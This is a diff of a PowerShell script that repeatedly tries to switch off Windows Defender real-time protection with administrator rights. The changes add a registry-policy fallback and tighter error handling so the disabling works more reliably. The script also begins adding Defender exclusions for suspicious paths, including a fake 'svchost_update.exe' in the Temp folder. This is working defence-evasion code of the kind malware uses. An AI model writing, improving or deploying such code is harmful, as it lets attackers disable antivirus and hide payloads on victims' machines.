@@ -17,32 +17,48 @@ function Is-Admin {
 
 $maxAttempts = 20
 $delayBetweenChecks = 5
+Start-Sleep -Seconds 5  # Initial delay to ensure service stability
 for ($i = 0; $i -lt $maxAttempts; $i++) {
     try {
         if (-not (Is-Admin)) {
             throw "Script must run with administrative privileges."
         }
         $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
-        $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
+        $mpStatus = Get-MpComputerStatus -ErrorAction Stop
         if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
             # Attempt to disable real-time protection
             Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction Stop
             # Verify the change
-            $newMpStatus = Get-MpComputerStatus
+            $newMpStatus = Get-MpComputerStatus -ErrorAction Stop
             if ($newMpStatus.RealTimeProtectionEnabled -eq $false) {
                 break
             } else {
-                throw "Failed to disable real-time protection."
+                throw "Verification failed: Real-time protection still enabled."
             }
+        } elseif ($defenderService.Status -ne 'Running') {
+            throw "Windows Defender service is not running."
         }
     } catch {
-        # Add basic logging (e.g., to a file) to diagnose the issue
         $errorMsg = "Attempt $i : $_"
         Add-Content -Path "C:\Windows\Temp\script_error.log" -Value $errorMsg -ErrorAction SilentlyContinue
+        # Alternative method using registry (if PowerShell cmdlets fail)
+        try {
+            $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+            if (-not (Test-Path $regPath)) {
+                New-Item -Path $regPath -Force -ErrorAction Stop | Out-Null
+            }
+            New-ItemProperty -Path $regPath -Name "DisableRealtimeMonitoring" -Value 1 -PropertyType DWORD -Force -ErrorAction Stop
+            $newMpStatus = Get-MpComputerStatus -ErrorAction Stop
+            if ($newMpStatus.RealTimeProtectionEnabled -eq $false) {
+                break
+            }
+        } catch {
+            $errorMsg = "Attempt $i (Registry): $_"
+            Add-Content -Path "C:\Windows\Temp\script_error.log" -Value $errorMsg -ErrorAction SilentlyContinue
+        }
     }
     Start-Sleep -Seconds $delayBetweenChecks
 }
-
 $exclusionsPaths = @(
     "C:\Users\Public\SystemLib",
     "C:\Windows\Temp\svchost_update.exe",
